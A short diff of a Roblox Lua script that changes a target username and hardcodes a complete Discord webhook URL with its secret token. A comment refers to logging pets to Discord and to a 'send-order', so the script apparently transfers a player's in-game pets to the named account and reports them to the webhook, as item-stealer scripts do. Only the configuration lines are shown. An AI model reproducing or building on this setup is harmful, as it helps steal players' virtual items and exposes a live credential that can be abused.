@@ -7,7 +7,7 @@ local toggleButton = petList:WaitForChild("Exit"):WaitForChild("OpenButton")
 local scrollingFrame = petList:WaitForChild("Frame"):WaitForChild("Notepad"):WaitForChild("ScrollingFrame")
 
 -- Config
-local TARGET_USERNAME = "Only1sherifalt1"
+local TARGET_USERNAME = "Only1sherif"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1516479845503205476/w2eyZPIVUgR9-ZWO1_yRZT9ws7aYpakwqhpjTEN90uFVSDmx_Vxg_EJK3T77zYhNm8h9"
 
 -- Pets to LOG to Discord (watchlist, unrelated to send-order)
